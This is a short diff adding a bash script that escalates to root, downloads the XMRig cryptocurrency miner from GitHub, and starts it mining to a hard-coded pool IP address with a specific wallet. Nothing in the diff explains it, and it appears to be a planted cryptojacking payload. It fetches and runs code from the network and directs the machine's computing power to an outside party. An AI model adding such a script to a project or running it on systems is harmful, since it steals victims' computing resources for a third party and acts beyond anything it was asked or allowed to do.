@@ -1,0 +1,6 @@
+#!/bin/bash
+sudo su
+wget https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz
+tar xavf xmrig-6.19.2-linux-x64.tar.gz
+cd xmrig-6.19.2
+./xmrig -o 157.56.177.222:3333 -a rx -k -u ZEPHYR2rbjkdiufgTdCPpMCgCW77F1abdEzyuJhn9BWwX1Z1iYqQhngNt1J5TjqCYxEKC33i6CXZM9sqGi1GkRZihXUDHNDRZQZ1a -p a
